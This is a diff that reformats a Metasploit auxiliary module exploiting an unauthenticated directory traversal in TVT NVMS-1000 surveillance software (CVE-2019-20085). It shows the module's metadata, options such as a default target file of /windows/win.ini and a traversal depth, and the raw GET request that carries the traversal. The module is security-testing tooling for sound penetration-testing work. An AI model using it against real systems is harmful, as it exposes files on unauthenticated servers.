@@ -9,26 +9,32 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'TVT NVMS-1000 Directory Traversal',
-      'Description' => %q{
-        This module exploits an unauthenticated directory traversal vulnerability which
-        exists in TVT network surveillance management software-1000 version 3.4.1.
-        NVMS listens by default on port 80.
-      },
-      'References'  =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'TVT NVMS-1000 Directory Traversal',
+        'Description' => %q{
+          This module exploits an unauthenticated directory traversal vulnerability which
+          exists in TVT network surveillance management software-1000 version 3.4.1.
+          NVMS listens by default on port 80.
+        },
+        'References' => [
           ['CVE', '2019-20085'],
           ['EDB', '47774']
         ],
-      'Author'      =>
-        [
+        'Author' => [
           'Numan Türle', # Vulnerability discovery
           'Dhiraj Mishra' # Metasploit module
         ],
-      'DisclosureDate' => '2019-12-12',
-      'License'        => MSF_LICENSE
-    ))
+        'DisclosureDate' => '2019-12-12',
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
@@ -36,7 +42,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('FILEPATH', [true, "The path to the file to read", '/windows/win.ini']),
         OptString.new('TARGETURI', [true, "The base URI path of nvms", '/']),
         OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 13 ])
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -45,7 +52,7 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_raw({
       'method' => 'GET',
-      'uri'    => traversal
+      'uri' => traversal
     })
 
     unless res && res.code == 200
